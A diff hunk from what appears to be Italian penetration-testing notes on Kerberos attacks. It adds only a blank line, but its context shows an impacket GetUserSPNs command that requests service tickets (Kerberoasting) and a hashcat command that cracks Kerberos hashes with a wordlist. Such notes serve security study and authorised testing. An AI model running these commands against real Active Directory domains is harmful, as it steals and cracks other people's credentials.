@@ -22,6 +22,7 @@ Dopo cracca l'hash
 impacket-GetUserSPNs <NOME MACCHINA>/<USER>:<PASS> -request
 ```
 ### **TGT BruteForce**
+
 ### **CRACK KRB5 HASH**
 ```bash
 hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
